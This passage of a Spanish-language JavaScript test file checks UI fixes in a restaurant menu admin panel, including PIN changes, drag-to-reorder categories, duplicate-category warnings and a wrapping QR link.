		assert.ok(clases.has('hay-mas-derecha'));
		assert.equal(clases.has('hay-mas-izquierda'), false);
	});

	test('repintar el carril no vuelve a registrar las escuchas', () => {
		// Se repinta al guardar cada plato. Antes cada repintado añadía otra rueda,
		// y el desplazamiento se multiplicaba por el número de guardados.
		const escuchas = {};
		const carril = { dataset: {}, offsetLeft: 0, scrollLeft: 0,
			addEventListener: (ev) => { escuchas[ev] = (escuchas[ev] || 0) + 1; } };
		const ctx = cargar('index.html', 'function initCatFilterDrag', '// ── PEDIDOS', {
			document: { getElementById: () => carril },
			window: { addEventListener() {} }, marcarBordes() {},
		});
		for (let i = 0; i < 5; i++) ctx.initCatFilterDrag();
		assert.equal(escuchas.wheel, 1, `la rueda quedó registrada ${escuchas.wheel} veces`);
		assert.equal(escuchas.mousedown, 1);
		assert.equal(escuchas.scroll, 1);
	});

	test('pintar el carril marca sus bordes, y elegir una categoría la trae a la vista', () => {
		const pintar = src.match(/function renderCatFilter\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(pintar, /marcarBordes\(wrap\);/);
		const elegir = src.match(/function setFilter\(catId,btn\) \{[\s\S]*?\n\}/)[0];
		assert.match(elegir, /btn\.scrollIntoView\?\.\(\{ block: 'nearest', inline: 'nearest'/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('la dirección de la carta se lee entera en la pestaña QR', () => {
	// M2 en docs/revision-ux.md: un campo de 232 px en móvil la cortaba.
	const src = codigoDelPanel();

	test('es un enlace que parte línea, no un campo de una sola línea', () => {
		assert.match(src, /<a id="qrEnlace" class="qr-enlace" target="_blank" rel="noopener"><\/a>/);
		assert.doesNotMatch(src, /<input[^>]*id="qrEnlace"/);
		const regla = src.match(/\.qr-enlace\{[^}]*\}/)[0];
		assert.match(regla, /overflow-wrap:anywhere/);
		assert.match(regla, /min-width:0/);
	});

	test('rellenar los controles pone la dirección como texto y como destino', () => {
		const campos = {};
		const $ = id => (campos[id] ||= {});
		const ctx = cargar('qr.js', 'function qrAplicarAControles', 'function qrCopiarEnlace', {
			document: { getElementById: $, querySelectorAll: () => [] }, qrCfg: {},
			urlPublica: () => 'https://menu.vmenus.co/zz-pruebas-ux', state: { restaurante: {} },
		});
		ctx.qrEnlace = () => 'https://menu.vmenus.co/zz-pruebas-ux';
		ctx.qrAplicarAControles();
		assert.equal(campos.qrEnlace.textContent, 'https://menu.vmenus.co/zz-pruebas-ux');
		assert.equal(campos.qrEnlace.href, 'https://menu.vmenus.co/zz-pruebas-ux');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el cliente cambia su propio PIN', () => {
	// CL3 en docs/revision-ux.md. La ruta está probada en pin.test.js; aquí, el panel.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	function montar(respuesta) {
		const campos = {};
		const $ = id => (campos[id] ||= { value: '', textContent: '', disabled: false });
		const peticiones = [], avisos = [], cerrados = [];
		const ctx = cargar('index.html', '// ── CAMBIAR MI PIN (cliente)', 'function entrarARestaurante', {
			document: { getElementById: $ },
			apiFetch: async (m, ruta, cuerpo) => { peticiones.push({ m, ruta, cuerpo }); if (respuesta instanceof Error) throw respuesta; return respuesta; },
			showToast: (m, t) => avisos.push({ m, t }), closeModal: id => cerrados.push(id), openModal() {}, setTimeout() {},
		});
		return { ctx, $, peticiones, avisos, cerrados };
	}

	test('explica en palabras lo que está mal antes de enviar nada', () => {
		const { ctx } = montar({ ok: true });
		assert.match(ctx.errorDeMiPin('', '5678', '5678'), /actual/);
		assert.match(ctx.errorDeMiPin('1234', '12', '12'), /entre 4 y 10/);
		assert.match(ctx.errorDeMiPin('1234', '12345678901', '12345678901'), /entre 4 y 10/);
		assert.match(ctx.errorDeMiPin('1234', '5678', '5679'), /no coinciden/);
		assert.match(ctx.errorDeMiPin('1234', '1234', '1234'), /igual/);
		assert.equal(ctx.errorDeMiPin('1234', '5678', '5678'), null);
	});

	test('con datos buenos manda el actual y el nuevo, cierra y lo dice', async () => {
		const { ctx, $, peticiones, avisos, cerrados } = montar({ ok: true });
		$('miPinActual').value = '1234'; $('miPinNuevo').value = '5678'; $('miPinRepetir').value = '5678';
		await ctx.guardarMiPin();
		assert.equal(JSON.stringify(peticiones), JSON.stringify([{ m: 'PATCH', ruta: '/api/mi-pin', cuerpo: { actual: '1234', nuevo: '5678' } }]));
		assert.deepEqual(cerrados, ['miPinModal']);
		assert.match(avisos[0].m, /PIN cambiado/);
		assert.equal($('miPinGuardar').disabled, false);
	});

	test('si no coinciden no sale ninguna petición', async () => {
		const { ctx, $, peticiones } = montar({ ok: true });
		$('miPinActual').value = '1234'; $('miPinNuevo').value = '5678'; $('miPinRepetir').value = '8765';
		await ctx.guardarMiPin();
		assert.equal(peticiones.length, 0);
		assert.match($('miPinError').textContent, /no coinciden/);
	});

	test('el PIN actual equivocado se queda en el modal, con el motivo', async () => {
		const { ctx, $, avisos, cerrados } = montar(new Error('El PIN actual no es correcto'));
		$('miPinActual').value = '0000'; $('miPinNuevo').value = '5678'; $('miPinRepetir').value = '5678';
		await ctx.guardarMiPin();
		assert.equal(cerrados.length, 0);
		assert.equal(avisos.length, 0);
		assert.match($('miPinError').textContent, /no es correcto/);
	});

	test('una sesión caducada no se anuncia como PIN cambiado', async () => {
		const { ctx, $, avisos } = montar(null);
		$('miPinActual').value = '1234'; $('miPinNuevo').value = '5678'; $('miPinRepetir').value = '5678';
		await ctx.guardarMiPin();
		assert.equal(avisos.length, 0);
	});

	test('el botón es solo del cliente, y los campos se entienden con el gestor de contraseñas', () => {
		assert.match(src, /getElementById\('btnMiPin'\)\.style\.display = state\.rol==='cliente'/);
		assert.match(src, /id="miPinActual" maxlength="10" autocomplete="current-password"/);
		assert.match(src, /id="miPinNuevo" maxlength="10" autocomplete="new-password"/);
	});

	test('ningún campo deja escribir un PIN que el login no admite', () => {
		// El login corta en 10: un PIN de 11 se guardaría y no serviría para entrar.
		assert.match(src, /id="pinInput"\s+maxlength="10"/);
		assert.match(src, /id="newPinValue"[^>]*maxlength="10"/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el modal de categoría avisa de una casi repetida', () => {
	// P3 en docs/revision-ux.md: «HAMBURGUESA» y «Hamburguesas» en la misma carta.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
	const CATS = [
		{ id: 'a', nombre: 'HAMBURGUESA' }, { id: 'b', nombre: 'Postres' }, { id: 'c', nombre: 'Café' },
	];

	function montar({ id = '', nombre = '', productos = [] } = {}) {
		const campos = { editCatId: { value: id }, editCatNombre: { value: nombre }, catParecida: { hidden: true, textContent: '' } };
		const ctx = cargar('index.html', [
			['importar.js', 'function impNormalizar', 'const IMP_SIN_CATEGORIA'],
			['importar.js', 'function impRaiz', 'function impTotales'],
			['// ── CATEGORÍA CASI REPETIDA (P3)', 'async function saveCat'],
		], { document: { getElementById: i => campos[i] }, state: { categorias: CATS, productos } });
		return { ctx, campos };
	}

	test('reconoce plural, mayúsculas y tildes, y no se compara consigo misma', () => {
		const { ctx } = montar();
		assert.equal(ctx.categoriaParecida('Hamburguesas', null, CATS).nombre, 'HAMBURGUESA');
		assert.equal(ctx.categoriaParecida('POSTRE', null, CATS).nombre, 'Postres');
		assert.equal(ctx.categoriaParecida('cafe', null, CATS).nombre, 'Café');
		assert.equal(ctx.categoriaParecida('HAMBURGUESA', 'a', CATS), null, 'editar la propia no avisa');
	});

	test('no avisa de lo que es distinto a propósito', () => {
		const { ctx } = montar();
		assert.equal(ctx.categoriaParecida('Postre del día', null, CATS), null);
		assert.equal(ctx.categoriaParecida('Perros', null, CATS), null);
		assert.equal(ctx.categoriaParecida('   ', null, CATS), null);
	});

	test('al crear, dice cuál es y cuántos platos tiene', () => {
		const { ctx, campos } = montar({ nombre: 'Hamburguesas', productos: [{ categoria_id: 'a' }, { categoria_id: 'a' }, { categoria_id: 'b' }] });
		ctx.avisarCategoriaParecida();
		assert.equal(campos.catParecida.hidden, false);
		assert.match(campos.catParecida.textContent, /«HAMBURGUESA» \(2 platos\)/);
		assert.match(campos.catParecida.textContent, /añade los platos ahí/);
	});

	test('al editar una ya duplicada, lo dice también', () => {
		const { ctx, campos } = montar({ id: 'zz', nombre: 'Hamburguesas', productos: [{ categoria_id: 'a' }] });
		ctx.avisarCategoriaParecida();
		assert.match(campos.catParecida.textContent, /\(1 plato\)/);
		assert.match(campos.catParecida.textContent, /pasa los platos a una/);
	});

	test('al corregir el nombre, el aviso desaparece', () => {
		const { ctx, campos } = montar({ nombre: 'Hamburguesas' });
		ctx.avisarCategoriaParecida();
		campos.editCatNombre.value = 'Perros';
		ctx.avisarCategoriaParecida();
		assert.equal(campos.catParecida.hidden, true);
	});

	test('se revisa al escribir y al abrir el modal, en los dos modos, y no bloquea el guardado', () => {
		assert.match(src, /id="editCatNombre"[^>]*oninput="avisarCategoriaParecida\(\)"/);
		const abrirNueva = src.match(/function openNewCatModal\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(abrirNueva, /avisarCategoriaParecida\(\);\s*openModal\('catModal'\)/);
		const abrirEditar = src.match(/function openEditCatModal\([^)]*\) \{[\s\S]*?\n\}/)[0];
		assert.match(abrirEditar, /avisarCategoriaParecida\(\);\s*openModal\('catModal'\)/);
		const guardar = src.match(/async function saveCat\(\) \{[\s\S]*?\n\}/)[0];
		assert.doesNotMatch(guardar, /categoriaParecida/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('las categorías se reordenan arrastrando', () => {
	// C1 en docs/revision-ux.md: 20 clics para subir la última de 21, y la fila
	// se escapaba del puntero en cada uno.
	const src = codigoDelPanel();
	const TRAMO = [['async function enTandas', 'function ordenProductosModo'], ['async function moveCat', '// ── ELIMINAR']];
	const cats = () => ['a', 'b', 'c', 'd'].map((id, i) => ({ id, nombre: id.toUpperCase(), orden: i }));

	function montar(extra = {}) {
		const patches = [], avisos = [];
		const ctx = cargar('index.html', TRAMO, {
			state: { categorias: cats(), restaurante: { id: 'r1' } },
			apiFetch: async (m, ruta, cuerpo) => { patches.push({ ruta, ...cuerpo }); return {}; },
			renderCatList() {}, renderCatFilter() {}, showToast: (m) => avisos.push(m),
			document: { querySelector: () => null }, ...extra,
		});
		return { ctx, patches, avisos };
	}

	test('llevar una fila a otra posición corre las demás', () => {
		const { ctx } = montar();
		assert.deepEqual([...ctx.moverEnLista(['a', 'b', 'c', 'd'], 3, 0)], ['d', 'a', 'b', 'c']);
		assert.deepEqual([...ctx.moverEnLista(['a', 'b', 'c', 'd'], 0, 2)], ['b', 'c', 'a', 'd']);
	});

	test('la posición sale de la altura del puntero frente a la mitad de cada fila', () => {
		const { ctx } = montar();
		const mitades = [100, 160, 220];
		assert.equal(ctx.posicionDeArrastre(mitades, 50), 0, 'por encima de todo, arriba');
		assert.equal(ctx.posicionDeArrastre(mitades, 130), 1);
		assert.equal(ctx.posicionDeArrastre(mitades, 999), 3, 'por debajo de todo, al final');
	});

	test('soltar la última arriba es un guardado con un solo aviso, no veinte', async () => {
		const { ctx, patches, avisos } = montar();
		assert.equal(await ctx.guardarOrdenCategorias(['d', 'a', 'b', 'c']), true);
		assert.deepEqual([...ctx.state.categorias.map(c => c.id)], ['d', 'a', 'b', 'c']);
		assert.deepEqual([...ctx.state.categorias.map(c => c.orden)], [0, 1, 2, 3]);
		assert.equal(patches.length, 4);
		assert.equal(avisos.length, 1);
	});

	test('soltar donde estaba no guarda nada', async () => {
		const { ctx, patches, avisos } = montar();
		assert.equal(await ctx.guardarOrdenCategorias(['a', 'b', 'c', 'd']), true);
		assert.equal(patches.length, 0);
		assert.equal(avisos.length, 0);
	});

	test('tras una flecha, el foco vuelve a la misma flecha de la fila movida', async () => {
		const enfocados = [];
		const boton = dir => ({ style: {}, focus: () => enfocados.push(dir), scrollIntoView() {} });
		const fila = { querySelector: sel => boton(sel.match(/data-dir="(-?\d)"/)[1]) };
		const { ctx } = montar({ document: { querySelector: sel => (sel.includes('data-id="c"') ? fila : null) } });
		await ctx.moveCat('c', -1);
		assert.deepEqual(enfocados, ['-1']);
	});

	test('si la captura del puntero falla, el arrastre no se queda abierto', () => {
		const clases = () => ({ add() {}, remove() {} });
		const escuchas = [];
		const fila = { classList: clases() };
		const lista = { classList: clases(), querySelectorAll: () => [], insertBefore() {} };
		const ctx = cargar('index.html', [['let arrastreCat=null;', '// ── ELIMINAR']], {
			document: { getElementById: () => lista, addEventListener: (t) => escuchas.push(t), removeEventListener() {} },
			requestAnimationFrame: () => 1, cancelAnimationFrame() {}, window: { innerHeight: 800, scrollBy() {} },
		});
		const ev = { button: 0, pointerId: 7, clientY: 10, preventDefault() {},
			currentTarget: { setPointerCapture() { throw new Error('NotFoundError'); } } };
		assert.doesNotThrow(() => ctx.empezarArrastreCat(ev, fila));
		assert.ok(escuchas.includes('pointerup'), 'sin la escucha de soltar, no se cierra nunca');
	});

	test('el asa solo bloquea el desplazamiento táctil en sí misma, y Escape cancela', () => {
		assert.match(src, /\.cat-asa\{[^}]*touch-action:none/);
		assert.doesNotMatch(src, /\.cat-row\{[^}]*touch-action:none/);
		assert.match(src, /asa\.addEventListener\('pointerdown',ev=>empezarArrastreCat\(ev,row\)\)/);
		const tecla = src.match(/function teclaArrastreCat\(ev\) \{[\s\S]*?\n\}/)[0];
		assert.match(tecla, /Escape[\s\S]*cancelarArrastreCat/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el modal de categoría marca las que se piden sin abrir la ficha', () => {
	// B3, segunda mitad, en docs/revision-ux.md.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	test('la casilla existe, se explica y tiene su etiqueta', () => {
		assert.match(src, /<input type="checkbox" id="editCatSinAbrir" aria-describedby="editCatSinAbrirAyuda">/);
		assert.match(src, /<label for="editCatSinAbrir"[^>]*>Se pide sin abrir la ficha<\/label>/);
		assert.match(src, /id="editCatSinAbrirAyuda"[^>]*>[\s\S]*?En la carta no cambia nada/);
	});

	test('al abrir se rellena en los dos modos', () => {
		const nueva = src.match(/function openNewCatModal\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(nueva, /getElementById\('editCatSinAbrir'\)\.checked=false/);
		const editar = src.match(/function openEditCatModal\([^)]*\) \{[\s\S]*?\n\}/)[0];
		assert.match(editar, /getElementById\('editCatSinAbrir'\)\.checked=!!cat\.atributos\?\.se_pide_sin_abrir/);
	});

	test('guardar la pone al marcarla y la borra al desmarcarla', () => {
		const guardar = src.match(/async function saveCat\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(guardar, /if\(document\.getElementById\('editCatSinAbrir'\)\.checked\) atributos\.se_pide_sin_abrir = true;\s*else delete atributos\.se_pide_sin_abrir;/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('la categoría lleva una nota opcional para la carta', () => {
	// P4 en docs/revision-ux.md: avisos hechos con platos de $ 0.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	test('el campo existe, con etiqueta y el mismo tope que el servidor', () => {
		assert.match(src, /<label for="editCatNota" class="form-label">Nota/);
		assert.match(src, /<textarea class="form-textarea" id="editCatNota" maxlength="200"/);
		const servidor = fs.readFileSync(path.join(__dirname, '..', 'server.js'), 'utf8');
		assert.match(servidor, /const NOTA_CATEGORIA_MAX = 200;/);
	});

	test('se rellena al abrir en los dos modos', () => {
		const nueva = src.match(/function openNewCatModal\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(nueva, /getElementById\('editCatNota'\)\.value=''/);
		const editar = src.match(/function openEditCatModal\([^)]*\) \{[\s\S]*?\n\}/)[0];
		assert.match(editar, /getElementById\('editCatNota'\)\.value=cat\.atributos\?\.nota \|\| ''/);
	});

	test('guardar la pone recortada, y vacía la borra', () => {
		const guardar = src.match(/async function saveCat\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(guardar, /const nota=document\.getElementById\('editCatNota'\)\.value\.trim\(\);\s*if\(nota\) atributos\.nota = nota; else delete atributos\.nota;/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('Apariencia enseña lo que el modelo usa', () => {
	// A4 en docs/revision-ux.md.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
	const conModelo = nav => {
		const mapa = { apNavModelo: { value: nav }, apEstiloFila: { style: {} }, apPortadaCard: { style: {} }, apHeroFila: { style: {} } };
		const ctx = cargar('index.html', [['function navElegido', 'function aplicarPlanAlPanel']], {
			state: { restaurante: { atributos: { nav } } },
			document: { getElementById: id => mapa[id] },
		});
		ctx.ajustarEstiloAlModelo();
		return mapa;
	};

	test('la portada solo con explorar', () => {
		assert.equal(conModelo('explorar').apPortadaCard.style.display, '');
		for (const nav of ['topnav', 'sidebar', 'carrito', 'video', 'vertical'])
			assert.equal(conModelo(nav).apPortadaCard.style.display, 'none', nav);
	});

	test('el mensaje de bienvenida solo con sidebar y carrito', () => {
		for (const nav of ['sidebar', 'carrito']) assert.equal(conModelo(nav).apHeroFila.style.display, 'flex', nav);
		for (const nav of ['topnav', 'explorar', 'video', 'vertical'])
			assert.equal(conModelo(nav).apHeroFila.style.display, 'none', nav);
	});

	test('se ajusta al cambiar el modelo y al cargar', () => {
		assert.match(src, /id="apNavModelo" onchange="ajustarEstiloAlModelo\(\)"/);
		assert.match(src, /getElementById\('apNavModelo'\)\.value = at\.nav \|\| 'topnav';[^\n]*\n[^\n]*\n\s*ajustarEstiloAlModelo\(\);/);
	});

	test('los filtros no se esconden ni dicen que son de explorar: los pintan todos los modelos', () => {
		assert.match(src, /<div class="section-card" id="apFiltrosCard">\s*<div class="section-title">Filtros y etiquetas<\/div>/);
		assert.doesNotMatch(src, /\(solo modelo explorar\)<\/span><\/div>/);
		const ajustar = src.match(/function ajustarEstiloAlModelo\(\) \{[\s\S]*?\n\}/)[0];
		assert.doesNotMatch(ajustar, /apFiltrosCard/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el formulario de crear restaurante va plegado', () => {
	// S4 en docs/revision-ux.md: seis gestos en móvil hasta el primer restaurante.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	test('es un <details> cerrado, con el título como lo que se pulsa', () => {
		assert.match(src, /<details class="new-resto-card" id="nuevoRestoPanel">\s*<summary class="section-title new-resto-summary">\+ Nuevo restaurante<\/summary>/);
		assert.doesNotMatch(src, /<details class="new-resto-card" id="nuevoRestoPanel" open/);
		const i = src.indexOf('id="nuevoRestoPanel"');
		const f = src.indexOf('</details>', i);
		assert.ok(src.slice(i, f).includes('id="newRestoNombre"'), 'los campos van dentro');
		assert.ok(src.slice(i, f).includes('onclick="crearRestaurante()"'));
	});

	test('al crear se pliega, antes de llevar al restaurante nuevo', () => {
		const crear = src.match(/async function crearRestaurante\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(crear, /getElementById\('nuevoRestoPanel'\)\.open=false;\s*llevarARestauranteNuevo/);
	});

	test('el PIN de un restaurante nuevo no pasa de lo que admite el login', () => {
		assert.match(src, /id="newRestoPin"[^>]*maxlength="10"/);
		const crear = src.match(/async function crearRestaurante\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(crear, /pin\.length>10/);
	});
});
